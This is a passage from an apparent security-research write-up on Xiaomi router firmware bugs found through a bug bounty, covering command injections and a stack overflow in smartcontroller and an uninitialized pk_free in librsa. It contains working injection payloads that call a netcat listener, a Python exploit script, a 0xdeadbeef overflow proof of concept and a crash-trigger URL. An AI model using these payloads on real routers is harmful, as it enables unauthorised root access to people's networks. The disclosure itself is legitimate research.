</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;command&#34;</span>:<span style=color:#e6db74>&#34;scene_setting&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;name&#34;</span>:<span style=color:#e6db74>&#34;it3&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;action_list&#34;</span>:[
</span></span><span style=display:flex><span>            {
</span></span><span style=display:flex><span>                <span style=color:#f92672>&#34;thirdParty&#34;</span>:<span style=color:#e6db74>&#34;xmrouter&#34;</span>,
</span></span><span style=display:flex><span>                <span style=color:#f92672>&#34;delay&#34;</span>:<span style=color:#ae81ff>17</span>,
</span></span><span style=display:flex><span>                <span style=color:#f92672>&#34;type&#34;</span>:<span style=color:#e6db74>&#34;wan_block&#34;</span>,
</span></span><span style=display:flex><span>                <span style=color:#f92672>&#34;payload&#34;</span>:
</span></span><span style=display:flex><span>                    {
</span></span><span style=display:flex><span>                        <span style=color:#f92672>&#34;command&#34;</span>:<span style=color:#e6db74>&#34;wan_block&#34;</span>,
</span></span><span style=display:flex><span>                        <span style=color:#75715e>// Command Injection - making an exterior connection
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                        <span style=color:#f92672>&#34;mac&#34;</span>:<span style=color:#e6db74>&#34;;nc 192.168.31.161 4242;#&#34;</span>
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        ],
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;launch&#34;</span>:
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;timer&#34;</span>:
</span></span><span style=display:flex><span>                {
</span></span><span style=display:flex><span>                    <span style=color:#f92672>&#34;time&#34;</span>:<span style=color:#e6db74>&#34;2:2&#34;</span>,
</span></span><span style=display:flex><span>                    <span style=color:#f92672>&#34;repeat&#34;</span>:<span style=color:#e6db74>&#34;0&#34;</span>,
</span></span><span style=display:flex><span>                    <span style=color:#f92672>&#34;enabled&#34;</span>:<span style=color:#66d9ef>true</span>
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Then, we need to start this scene by using the command <code>scene_start_by_crontab</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;command&#34;</span>:<span style=color:#e6db74>&#34;scene_start_by_crontab&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;time&#34;</span>:<span style=color:#e6db74>&#34;2:2&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;week&#34;</span>:<span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>A simple python script can be written to exploit the vulnerability:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>AUTH_TOKEN <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;bd3ff46458f812a97b4e9f10945c6ce5&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>URL <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;http://192.168.31.1/cgi-bin/luci/;stok=</span><span style=color:#e6db74>{</span>AUTH_TOKEN<span style=color:#e6db74>}</span><span style=color:#e6db74>/api/xqsmarthome/request_smartcontroller&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>command <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;nc 192.168.31.161 4242&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>requests<span style=color:#f92672>.</span>post(URL, data<span style=color:#f92672>=</span>{
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;payload&#34;</span>:<span style=color:#e6db74>&#39;{&#34;command&#34;:&#34;scene_setting&#34;,&#34;name&#34;:&#34;it3&#34;,&#34;action_list&#34;:[{&#34;thirdParty&#34;:&#34;xmrouter&#34;,&#34;delay&#34;:17,&#34;type&#34;:&#34;wan_block&#34;,&#34;payload&#34;:{&#34;command&#34;:&#34;wan_block&#34;,&#34;mac&#34;:&#34;;&#39;</span> <span style=color:#f92672>+</span> command <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;;#&#34;}}],&#34;launch&#34;:{&#34;timer&#34;:{&#34;time&#34;:&#34;2:2&#34;,&#34;repeat&#34;:&#34;0&#34;,&#34;enabled&#34;:true}}}&#39;</span>
</span></span><span style=display:flex><span>})
</span></span><span style=display:flex><span>requests<span style=color:#f92672>.</span>post(URL, data<span style=color:#f92672>=</span>{
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;payload&#34;</span>:<span style=color:#e6db74>&#39;{&#34;command&#34;:&#34;scene_start_by_crontab&#34;,&#34;time&#34;:&#34;2:2&#34;,&#34;week&#34;:0}&#39;</span>
</span></span><span style=display:flex><span>})
</span></span></code></pre></div><p>This way, we receive a connection with our listener:</p><p><a href=/posts/img/xiaomi-routers/sc_os_injection_exterior_conn.png target=_blank><img src=/posts/img/xiaomi-routers/sc_os_injection_exterior_conn.png alt=smartcontroller_rce></a></p><p>With this <code>system</code> injection in the <code>/usr/sbin/smartcontroller</code> binary, we can now validate another LAN post-authorization RCE vulnerability, which is not a duplicate this time!</p><h4 id=endpoint-apixqsmarthomerequest_smartcontroller---stack-buffer-overflow-cve-2023-26318>Endpoint <code>/api/xqsmarthome/request_smartcontroller</code> - Stack Buffer Overflow (CVE-2023-26318)</h4><p>In the same portion of code as the vulnerability above, we can see that <code>smartcontroller</code> is also vulnerable to a stack buffer overflow. The <code>mac</code> parameter, which is user-controlled, is directly injected into a stack buffer using <code>sprintf()</code>, which means the length of the string copied to <code>cmd_buffer</code> is not checked.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>// the `mac` parameter is user controlled
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>int32_t</span> <span style=color:#a6e22e>run_sysapi_macfilter</span>(<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> mac, <span style=color:#66d9ef>int32_t</span> enabled)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> <span style=color:#66d9ef>const</span> yes_no;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> cmd_buffer[<span style=color:#ae81ff>0x64</span>];
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>memset</span>(<span style=color:#f92672>&amp;</span>cmd_buffer, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0x64</span>);
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (enable <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        yes_no <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;no&#34;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        yes_no <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;yes&#34;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// `mac` is directly injected into the `cmd_buffer` (stack buffer) without length check! 
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>sprintf</span>(<span style=color:#f92672>&amp;</span>cmd_buffer,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;/usr/sbin/sysapi macfilter set mac=%s wan=%s;/usr/sbin/sysapi macfilter commit&#34;</span>,
</span></span><span style=display:flex><span>            mac,
</span></span><span style=display:flex><span>            a3);  
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>run_cmd</span>(<span style=color:#f92672>&amp;</span>cmd_buffer);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>We can then produce a quick PoC to overwrite the return address and set the program counter <code>PC</code> to <code>0xdeadbeef</code>:</p><ul><li>First payload</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#960050;background-color:#1e0010>[...]</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// payload is basically the same as the previous one
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>// mac: A * 81 + 0xdeadbeef (URL encoded)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#f92672>&#34;mac&#34;</span>:<span style=color:#e6db74>&#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%de%ad%be%ef&#34;</span>
</span></span><span style=display:flex><span>    [<span style=color:#960050;background-color:#1e0010>...</span>]
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><ul><li>Second payload</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;command&#34;</span>:<span style=color:#e6db74>&#34;scene_start_by_crontab&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;time&#34;</span>:<span style=color:#e6db74>&#34;2:2&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;week&#34;</span>:<span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>We can then check in gdb that we effectively control the <code>PC</code>:</p><p><a href=/posts/img/xiaomi-routers/sc_deadbeef.png target=_blank><img src=/posts/img/xiaomi-routers/sc_deadbeef.png alt=0xdeadbeef></a></p><p>Unfortunately, since the vulnerability comes from the use of <code>sprintf</code> with a <code>%s</code> formatter, we cannot use NULL bytes in the payload. Consequently, we cannot use ROP gadgets to execute arbitrary code within the binary as we know that the base address of the binary is <code>0x00400000</code> (starting with a NULL byte) and that we can&rsquo;t just make a partial address overwrite due to the endianness.</p><p>An exploit would require an ASLR bruteforce (which is reasonable on a 32-bit system) or an ASLR leak for example. Unfortunately, the binary is not restarted when it crashes, thus making the bruteforce pretty much impossible, but it is still a DoS. Since we had already discovered several RCEs, we decided not to spend too much time on this non-trivial vulnerability exploitation.</p><h4 id=endpoint-apixqsmarthomerequest_smartcontroller---another-command-injection>Endpoint <code>/api/xqsmarthome/request_smartcontroller</code> - Another Command Injection</h4><p>After having submitted the previous reports to Xiaomi, we were happy with our LAN post-authorization research as we had found a way to obtain a root shell on the router and also found non-duplicate RCEs eligible for their bug bounty program.</p><p>Soon enough, however, a second read-through of the <code>smartcontroller</code> program revealed another command injection. Unfortunately, our previous report on the binary drew Xiaomi&rsquo;s attention and they apparently found this injection shortly before our report. It was a duplicate once again but it taught us to fully finish a security audit before hastily reporting bugs.</p><p>This second command injection resides in the method that we renamed <code>feedPush</code> at <code>0x405384</code>. The <code>scene_name</code> parameter is directly injected in <code>system()</code> without any sanitization in the <code>run_cmd_arg</code> function.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>int32_t</span> <span style=color:#a6e22e>run_cmd_arg</span>(<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> cmd, <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> arg)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int32_t</span> ret;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>is_empty_str</span>(cmd) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>is_empty_str</span>(arg) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>run_cmd</span>(cmd);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int32_t</span> len <span style=color:#f92672>=</span> <span style=color:#a6e22e>strlen</span>(cmd) <span style=color:#f92672>+</span> <span style=color:#a6e22e>strlen</span>(arg) <span style=color:#f92672>+</span> <span style=color:#ae81ff>5</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> final_command <span style=color:#f92672>=</span> <span style=color:#a6e22e>malloc</span>(len);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>memset</span>(final_command, <span style=color:#ae81ff>0</span>, len);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// Here, an attempt of escaping `arg` to try to avoid command injections 
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#a6e22e>sprintf</span>(final_command, <span style=color:#e6db74>&#34;%s &#39;%s&#39;&#34;</span>, cmd, arg);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// The final command is then executed with `system()`
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        ret <span style=color:#f92672>=</span> <span style=color:#a6e22e>run_cmd</span>(final_command);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>free</span>(final_command);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> ret;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int32_t</span> <span style=color:#a6e22e>feedPush</span>(scene_struct<span style=color:#f92672>*</span> scene)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    json_object<span style=color:#f92672>*</span> new_dupe <span style=color:#f92672>=</span> <span style=color:#a6e22e>json_object_new_object</span>();
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>json_object_object_add</span>(new_dupe, <span style=color:#e6db74>&#34;type&#34;</span>, <span style=color:#a6e22e>json_object_new_int</span>(<span style=color:#ae81ff>5</span>));
</span></span><span style=display:flex><span>    json_object<span style=color:#f92672>*</span> new_obj <span style=color:#f92672>=</span> <span style=color:#a6e22e>json_object_new_object</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// `scene_name` is user controlled
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>json_object_object_add</span>(new_obj, <span style=color:#e6db74>&#34;name&#34;</span>, <span style=color:#a6e22e>json_object_new_string</span>(scene<span style=color:#f92672>-&gt;</span>scene_name));
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    [...]
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>json_object_object_add</span>(new_dupe, <span style=color:#e6db74>&#34;data&#34;</span>, new_obj);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// user controlled data is duplicated and stringified
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> duplicate_data <span style=color:#f92672>=</span> <span style=color:#a6e22e>strdup</span>(<span style=color:#a6e22e>json_object_to_json_string</span>(new_dupe));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int32_t</span> v0_6 <span style=color:#f92672>=</span> <span style=color:#a6e22e>json_object_put</span>(new_dupe);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (duplicate_data <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> v0_6;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// `duplicate_data` is directly injected into `system()`
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>run_cmd_arg</span>(<span style=color:#e6db74>&#34;/usr/sbin/feedPush&#34;</span>, duplicate_data);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>free</span>(duplicate_data);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>We can easily escape the quotes in <code>run_cmd_arg</code> by using a simple trick (<code>$(shell command)</code>) and inject the <code>scene_name</code>. To PoC this vulnerability, we can use those two payloads (again, similar to the previous ones):</p><ul><li>First payload</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;command&#34;</span>:<span style=color:#e6db74>&#34;scene_setting&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Command Injection - making an exterior connection
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#f92672>&#34;name&#34;</span>:<span style=color:#e6db74>&#34;&#39;$(nc 192.168.31.98 4242)&#39;&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#960050;background-color:#1e0010>[...]</span> <span style=color:#75715e>// same as before
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
</span></span></code></pre></div><ul><li>Second payload</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;command&#34;</span>:<span style=color:#e6db74>&#34;scene_start_by_crontab&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;time&#34;</span>:<span style=color:#e6db74>&#34;2:2&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;week&#34;</span>:<span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>This way, we receive a connection with our listener and confirm the RCE:</p><p><a href=/posts/img/xiaomi-routers/sc_2_os_inject_exterior_conn.png target=_blank><img src=/posts/img/xiaomi-routers/sc_2_os_inject_exterior_conn.png alt=smartcontroller_rce_2></a></p><h3 id=pre-authorization>Pre-authorization</h3><p>We now know that the post-authorization LAN is affected by several bugs allowing us to get a root shell on the Xiaomi router: to do so, we need the admin password of the router&rsquo;s web interface to retrieve the authentication token. Naturally, it would be even more interesting if we could bypass that step: our next phase is then to look at the pre-authorization LAN interface so that any user connected to the WiFi can exploit the router.</p><p>The vulnerabilities on this LAN pre-auth surface were found in the <code>lua_rsa_pubkey_encrypt()</code> method from Xiaomi&rsquo;s <code>/usr/lib/lua/librsa.so</code> library. Using the endpoint&rsquo;s name, we guess this function simplifies sharing the WiFi password through a link. This function is exposed before authentication via an API endpoint of the router&rsquo;s interface: <code>http://192.168.31.1/cgi-bin/luci/api/misystem/get_wifi_pwd_url?rsa_pubkey=</code>.</p><h4 id=endpoint-apimisystemget_wifi_pwd_url---pk_free>Endpoint <code>/api/misystem/get_wifi_pwd_url</code> - pk_free()</h4><p>First, we can trigger a call to <code>pk_free()</code> from <code>libembedtls.so</code> on an uninitialized pointer in <code>public_encrypt_keybuf()</code> (called by <code>lua_rsa_pubkey_encrypt()</code>) when giving a malformed RSA public key. This bug could theoretically lead to Remote Code Execution by carefully organizing the stack as we will see.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>int32_t</span> <span style=color:#a6e22e>public_encrypt_keybuf</span>(<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> url, <span style=color:#66d9ef>int32_t</span> url_len, <span style=color:#66d9ef>int32_t</span><span style=color:#f92672>*</span> arg3, <span style=color:#66d9ef>int32_t</span><span style=color:#f92672>*</span> arg4, <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> controlled_key, <span style=color:#66d9ef>int32_t</span> key_len)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int32_t</span> ret_code;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>void</span><span style=color:#f92672>*</span> pk_ctx;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int32_t</span> b64_needed_len <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>base64_decode</span>(<span style=color:#ae81ff>0</span>, <span style=color:#f92672>&amp;</span>b64_needed_len, controlled_key, key_len);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (sys_log_enable <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>syslog</span>(<span style=color:#ae81ff>6</span>, <span style=color:#e6db74>&#34; rsa crypto  base64_decode need …&#34;</span>, b64_needed_len);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> b64 <span style=color:#f92672>=</span> <span style=color:#a6e22e>calloc</span>((b64_needed_len <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>), <span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int32_t</span> err_code <span style=color:#f92672>=</span> <span style=color:#a6e22e>base64_decode</span>(b64, <span style=color:#f92672>&amp;</span>b64_needed_len, controlled_key, key_len);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (err_code <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>       [..]
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (sys_log_enable <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>syslog</span>(<span style=color:#ae81ff>6</span>, <span style=color:#e6db74>&#34; rsa crypto  base64_decode faile…&#34;</span>, err_code);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        ret_code <span style=color:#f92672>=</span> <span style=color:#ae81ff>101</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// This is freed but was never initialized if(err_code != 0) 
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#a6e22e>pk_free</span>(<span style=color:#f92672>&amp;</span>pk_ctx);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>free</span>(b64);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> ret_code;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>To trigger the <code>pk_free()</code> bug, we just need to send a malformed RSA public key with non-base64 characters. For example: <code>http://192.168.31.1/cgi-bin/luci/api/misystem/get_wifi_pwd_url?rsa_pubkey=%01</code>.</p><p>In GDB, we can see that an unmapped address is dereferenced in <code>pk_free()</code>:</p><p><a href=/posts/img/xiaomi-routers/uninitfree_gdb.png target=_blank><img src=/posts/img/xiaomi-routers/uninitfree_gdb.png alt="uninit free"></a></p><p>To understand this vulnerability a bit more, let&rsquo;s look at the source code of the <code>pk_free()</code> function from <code>libmbedtls</code> that we can find online: <a href=https://os.mbed.com/users/ansond/code/mbedTLSLibrary/docs/137634ff4186/pk_8c_source.html>libmbedtls</a>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>/*
</span></span></span><span style=display:flex><span><span style=color:#75715e> * Free (the components of) a pk_context
</span></span></span><span style=display:flex><span><span style=color:#75715e> */</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>pk_free</span>( pk_context <span style=color:#f92672>*</span>ctx )
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>( ctx <span style=color:#f92672>==</span> NULL <span style=color:#f92672>||</span> ctx<span style=color:#f92672>-&gt;</span>pk_info <span style=color:#f92672>==</span> NULL )
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    ctx<span style=color:#f92672>-&gt;</span>pk_info<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>ctx_free_func</span>( ctx<span style=color:#f92672>-&gt;</span>pk_ctx );
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>polarssl_zeroize</span>( ctx, <span style=color:#66d9ef>sizeof</span>( pk_context ) );
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Here we can see that the context <code>ctx</code> stores at least a function pointer at <code>ctx->pk_info->ctx_free_func</code> and will call this function with <code>ctx->pk_ctx</code> as a parameter. If we manage to overwrite the stack frame of the function or prepare it using a previous call, and because the <code>pk_context</code> variable in <code>public_encrypt_kerybuf()</code> is not initialized at the beginning of the method, it is possible to build a fake <code>pk_context</code> structure in the stack.</p><p>For example, we could set <code>ctx->pk_info->ctx_free_func</code> to the <code>libc</code> <code>system</code> function and set <code>ctx->pk_ctx</code> to a custom string (example: &ldquo;/bin/sh&rdquo; to spawn a shell).</p><p>Unfortunately, it is complicated to set up the stack for this attack because we can see in the Lua code that <code>librsa.so</code> is mapped and unmapped at runtime with only one function from the library being called (<code>lua_rsa_pubkey_encrypt</code>), not really giving us any control:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-lua data-lang=lua><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>getWifiPwdUrl</span>()
</span></span><span style=display:flex><span>    [...]
</span></span><span style=display:flex><span>    <span style=color:#75715e>-- Here, `lirsa.so` is loaded</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>local</span> lua_crypto <span style=color:#f92672>=</span> require(<span style=color:#e6db74>&#34;librsa&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    [...]
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>local</span> rsa_pub_key <span style=color:#f92672>=</span> LuciHttp.formvalue(<span style=color:#e6db74>&#34;rsa_pubkey&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> rsa_pub_key <span style=color:#f92672>==</span> <span style=color:#66d9ef>nil</span> <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>        result.code <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>        result[<span style=color:#e6db74>&#34;msg&#34;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http get rsa_pubkey null.&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span>        [...]
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>local</span> url <span style=color:#f92672>=</span> string.format(<span style=color:#e6db74>&#39;http://%s/cgi-bin/luci/api/misystem/get_wifi_pwd?token=%s&#39;</span>, lanip, token)
</span></span><span style=display:flex><span>            XQLog.log(<span style=color:#ae81ff>6</span>,<span style=color:#e6db74>&#34;iot url_origin:&#34;</span><span style=color:#f92672>..</span>url)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>-- Here, only `lua_rsa_pubkey_encrypt` is called</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>local</span> url_new <span style=color:#f92672>=</span> lua_crypto.lua_rsa_pubkey_encrypt(url, rsa_pub_key)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> url_new <span style=color:#f92672>~=</span> <span style=color:#66d9ef>nil</span> <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>                [...]
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>                XQLog.log(<span style=color:#ae81ff>6</span>,<span style=color:#e6db74>&#34;lua call C lib lua_rsa_pubkey_encrypt() ret nil&#34;</span>)
</span></span><span style=display:flex><span>                result.code <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>
